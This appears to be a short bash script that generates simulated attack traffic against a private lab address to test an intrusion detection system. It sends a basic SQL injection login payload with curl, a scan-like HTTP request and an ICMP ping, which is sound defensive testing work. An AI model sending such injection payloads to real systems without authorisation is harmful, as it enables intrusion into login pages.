#!/bin/bash
# attack_test.sh
# description: simulate attack traffic for IDS detection test

TARGET_IP="10.10.10.200"

echo "[*] Initializing attack sequence against $TARGET_IP"

# 1. SQL Injection Simulation
echo "[+] Step 1: Sending SQL Injection Payload (Target: Port 80)"
curl -s -d "username=admin' union select 1,2,3--&password=123" http://$TARGET_IP/login.php > /dev/null
sleep 1

# 2. Scanning / Enumeration Simulation
echo "[+] Step 2: Simulating Nmap-like HTTP GET Scan"
curl -s -X GET "http://$TARGET_IP/ HTTP/1.0" > /dev/null
sleep 1

# 3. Simple ICMP Ping Sweep
echo "[+] Step 3: Sending ICMP Ping Sweep"
ping -c 3 $TARGET_IP > /dev/null

echo "[*] Attack Sequence Completed."
